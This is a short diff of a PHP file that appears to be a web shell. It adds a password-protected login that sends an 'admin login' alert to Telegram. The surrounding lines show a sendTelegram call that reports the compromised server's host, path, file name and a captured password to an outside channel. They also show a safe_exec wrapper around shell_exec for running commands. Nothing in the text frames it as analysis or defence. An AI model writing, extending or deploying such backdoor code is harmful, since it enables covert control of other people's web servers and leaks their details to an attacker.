@@ -30,6 +30,15 @@ function sendTelegram($domain, $path, $file, $passwordInput) {
 if (function_exists('sendTelegram')) {
     sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_SESSION['password_input'] ?? 'unknown');
 }
+if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
+    $_SESSION['loggedin'] = true;
+
+    // Kirim notifikasi Telegram
+    sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), 'admin login');
+
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit();
+}
 function safe_exec($cmd) {
     // shell_exec
     if (function_exists('shell_exec') && is_callable('shell_exec')) {
